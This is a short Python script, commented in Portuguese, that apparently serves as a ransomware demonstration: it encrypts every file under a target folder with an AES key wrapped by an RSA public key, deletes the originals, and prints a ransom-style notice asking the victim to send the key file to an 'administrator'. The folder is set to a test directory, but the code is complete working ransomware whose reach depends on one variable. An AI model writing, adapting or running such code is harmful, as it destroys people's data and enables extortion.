import os
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding

# CONFIGURAÇÕES
TARGET_DIR = "./test_folder" # Altere para a pasta de teste
PUBLIC_KEY_PATH = "public_key.pem"
EXTENSION = ".locked"

def load_public_key():
    with open(PUBLIC_KEY_PATH, "rb") as key_file:
        return serialization.load_pem_public_key(key_file.read())

def encrypt_key(aes_key, public_key):
    # Criptografa a chave AES usando RSA
    encrypted_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted_key

def main():
    # 1. Gerar chave AES de sessão
    aes_key = Fernet.generate_key()
    cipher = Fernet(aes_key)
    
    # 2. Proteger a chave AES com a chave pública RSA
    pub_key = load_public_key()
    encrypted_aes_key = encrypt_key(aes_key, pub_key)
    
    with open("session.key", "wb") as f:
        f.write(encrypted_aes_key)

    # 3. Criptografar arquivos
    for root, dirs, files in os.walk(TARGET_DIR):
        for file in files:
            if file.endswith(EXTENSION) or file == "session.key":
                continue
                
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as f:
                    data = f.read()
                
                encrypted_data = cipher.encrypt(data)
                
                with open(file_path + EXTENSION, "wb") as f:
                    f.write(encrypted_data)
                
                os.remove(file_path) # Remove o original
                print(f"Criptografado: {file}")
            except Exception as e:
                print(f"Erro em {file}: {e}")

    print("\n--- SEUS ARQUIVOS FORAM CRIPTOGRAFADOS ---")
    print("Para recuperá-los, envie o arquivo 'session.key' para o administrador.")

if __name__ == "__main__":
    main()
